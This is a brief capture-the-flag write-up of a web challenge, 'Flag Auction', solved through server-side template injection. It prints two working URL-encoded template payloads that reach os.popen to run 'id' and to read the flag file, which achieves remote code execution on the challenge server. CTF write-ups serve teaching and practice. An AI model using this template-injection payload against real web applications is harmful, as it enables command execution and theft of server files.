# Flag Auction
SSTI challenge without any apparent blacklist or filters, the harder part was to find where the flag was. 

```
https://web.ctf.devclub.in/web/4/buy/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D?
```

to run the `id` command. We have RCE. Finding the flag took a while but found it when I randomly decided to run the env command. We find an
environment variable `FLAG_DIR=/srv/http/app2/src`. 

```
https://web.ctf.devclub.in/web/4/buy/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('cat%20/srv/http/app2/src/required_file').read()%7D%7D?
```

gives the flag.
